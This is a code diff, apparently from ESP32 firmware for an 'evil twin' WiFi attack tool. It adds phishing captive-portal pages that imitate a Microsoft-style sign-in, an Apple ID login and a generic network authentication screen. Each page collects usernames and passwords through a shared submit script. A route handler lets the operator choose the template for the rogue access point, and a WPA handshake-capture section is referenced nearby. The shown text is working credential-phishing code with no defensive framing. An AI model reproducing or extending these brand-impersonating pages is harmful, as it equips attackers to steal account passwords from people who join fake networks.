+<div class="sub">to access )rawliteral" + ssid + R"rawliteral(</div>
+<form id="lf" onsubmit="doLogin(event)">
+<div class="fg"><input type="text" id="u" name="username" placeholder="Email, phone, or Skype" required></div>
+<div class="fg"><input type="password" id="p" name="password" placeholder="Password" required></div>
+<a href="#" class="fl" onclick="return false">Forgot password?</a>
+<button type="submit" class="btn">Sign in</button>
+</form>
+<div class="ft">No account? <a href="#" style="color:#0067b8;text-decoration:none" onclick="return false">Create one!</a></div>
+</div>)rawliteral" + submitJS + "</body></html>";
+
+    case 4: // Apple ID Login
+      return R"rawliteral(
+<!DOCTYPE html><html><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Apple ID</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif}
+body{background:#f5f5f7;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px}
+.box{background:#fff;width:100%;max-width:400px;border-radius:16px;box-shadow:0 4px 16px rgba(0,0,0,0.08);padding:40px 36px;text-align:center;position:relative}
+.logo{font-size:48px;margin-bottom:12px;color:#333}
+.title{font-size:22px;font-weight:600;color:#1d1d1f;margin-bottom:4px}
+.sub{font-size:14px;color:#86868b;margin-bottom:28px}
+.fg{margin-bottom:16px;text-align:left}
+.fg label{display:block;font-size:12px;color:#86868b;margin-bottom:4px;font-weight:500}
+.fg input{width:100%;padding:12px 16px;border:1px solid #d2d2d7;border-radius:12px;font-size:17px;color:#1d1d1f;background:#fbfbfd}
+.fg input:focus{outline:none;border-color:#0071e3;box-shadow:0 0 0 3px rgba(0,113,227,0.15)}
+.fg input::placeholder{color:#86868b}
+.btn{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:500;cursor:pointer;margin-top:8px;margin-bottom:16px}
+.btn:hover{background:#0077ed}
+.fl{font-size:14px;color:#0071e3;text-decoration:none;display:inline-block;margin-bottom:8px}
+.ft{margin-top:24px;font-size:12px;color:#86868b;border-top:1px solid #e5e5ea;padding-top:16px}
+)rawliteral" + loaderCSS + R"rawliteral(
+</style></head><body>
+<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
+<div class="logo">&#63743;</div>
+<div class="title">Apple ID</div>
+<div class="sub">Sign in to access )rawliteral" + ssid + R"rawliteral(</div>
+<form id="lf" onsubmit="doLogin(event)">
+<div class="fg"><label>Apple ID</label><input type="text" id="u" name="username" placeholder="Email or Phone Number" required></div>
+<div class="fg"><label>Password</label><input type="password" id="p" name="password" placeholder="Password" required></div>
+<button type="submit" class="btn">Sign In</button>
+</form>
+<a href="#" class="fl" onclick="return false">Forgot Apple ID or password?</a>
+<div class="ft"><p>Your Apple ID is the account for all Apple services.</p></div>
+</div>)rawliteral" + submitJS + "</body></html>";
+
+    default: // Generic WiFi Login (template 0)
+      return R"rawliteral(
+<!DOCTYPE html><html><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Network Authentication</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
+body{background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px}
+.box{background:#fff;width:100%;max-width:420px;border-radius:12px;box-shadow:0 4px 16px rgba(0,0,0,0.1);overflow:hidden;position:relative}
+.hd{background:#0066cc;color:#fff;padding:28px 24px;text-align:center}
+.hd h1{font-size:22px;font-weight:600;margin-bottom:6px}
+.hd p{font-size:14px;opacity:0.9}
+.badge{background:rgba(255,255,255,0.2);display:inline-block;padding:5px 12px;border-radius:20px;font-size:12px;margin-top:12px}
+.ct{padding:28px 24px}
+.notice{background:#e8f4fd;border-left:4px solid #0066cc;padding:12px;margin-bottom:24px;font-size:13px;color:#333;border-radius:4px}
+.fg{margin-bottom:18px}
+.fg label{display:block;margin-bottom:5px;font-weight:500;font-size:14px;color:#333}
+.fg input{width:100%;padding:12px 14px;border:1px solid #ddd;border-radius:6px;font-size:16px}
+.fg input:focus{outline:none;border-color:#0066cc}
+.opts{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;font-size:14px}
+.rem{display:flex;align-items:center;gap:8px}
+.rem input{width:auto}
+.fl{color:#0066cc;text-decoration:none}
+.btn{width:100%;padding:14px;background:#0066cc;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:20px}
+.btn:hover{background:#0052a3}
+.ft{text-align:center;padding:18px;background:#f5f5f5;font-size:12px;color:#666}
+)rawliteral" + loaderCSS + R"rawliteral(
+</style></head><body>
+<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
+<div class="hd"><h1>Network Authentication</h1><p>Secure connection required</p><div class="badge">SSID: )rawliteral" +
+         ssid + R"rawliteral(</div></div>
+<div class="ct">
+<div class="notice"><strong>Security Notice:</strong> Authentication required for internet access.</div>
+<form id="lf" onsubmit="doLogin(event)">
+<div class="fg"><label>Username or Email</label><input type="text" id="u" name="username" placeholder="Enter username or email" required></div>
+<div class="fg"><label>Password</label><input type="password" id="p" name="password" placeholder="Enter password" required></div>
+<div class="opts"><label class="rem"><input type="checkbox"> Remember me</label><a href="#" class="fl" onclick="return false">Forgot password?</a></div>
+<button type="submit" class="btn">Sign In</button>
+</form></div>
+<div class="ft"><p>&copy; 2026 Network Services. All rights reserved.</p></div>
+</div>)rawliteral" + submitJS + "</body></html>";
+  }
 }
 
 /* ============ EAPOL / HANDSHAKE ============ */
@@ -1552,6 +1709,8 @@ void setupRoutes() {
       return;
     }
     evilTwinSSID = ssid;
+    portalTemplate = server.arg("tpl").toInt();
+    if (portalTemplate < 0 || portalTemplate > 4) portalTemplate = 0;
     credentialsCount = 0;
     WiFi.softAPdisconnect(true);
     delay(100);
